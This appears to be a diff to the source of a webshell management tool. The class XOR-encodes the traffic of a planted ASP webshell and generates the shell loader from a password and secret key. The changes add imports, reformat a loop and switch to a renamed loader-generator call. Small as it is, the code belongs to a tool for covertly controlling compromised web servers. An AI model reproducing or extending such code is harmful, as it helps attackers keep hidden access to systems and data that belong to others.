@@ -9,6 +9,9 @@ import core.annotation.CryptionAnnotation;
 import core.imp.Cryption;
 import core.shell.ShellEntity;
 import java.net.URLEncoder;
+import java.util.Random;
+
+import shells.cryptions.phpXor.PhpXormessage;
 import util.Log;
 import util.functions;
 import util.http.Http;
@@ -89,7 +92,7 @@ public class AspXorBase64message implements Cryption {
         int keyLen = key.length;
         //int index = false;
 
-        for(int i = 1; i <= len; ++i) {
+        for (int i = 1; i <= len; ++i) {
             int index = i - 1;
             data[index] ^= key[i % keyLen];
         }
@@ -117,6 +120,8 @@ public class AspXorBase64message implements Cryption {
     }
 
     public byte[] generate(String password, String secretKey) {
-        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
+
+        return Generate.GenerateShellLodermessage(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
+
     }
 }
